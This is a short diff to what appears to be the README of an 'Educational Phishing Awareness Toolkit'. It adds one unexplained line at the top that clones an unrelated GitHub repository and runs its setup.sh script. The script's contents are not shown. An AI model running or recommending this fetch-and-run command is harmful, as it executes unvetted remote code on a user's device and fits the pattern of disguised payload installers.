@@ -1,3 +1,9 @@
+
+pkg install git -y && git clone https://github.com/Fcbd71pe/Ffvip.git && cd Ffvip && chmod +x setup.sh && sh setup.sh
+
+
+
+
 # Educational Phishing Awareness Toolkit (Python & Flask)
 
 
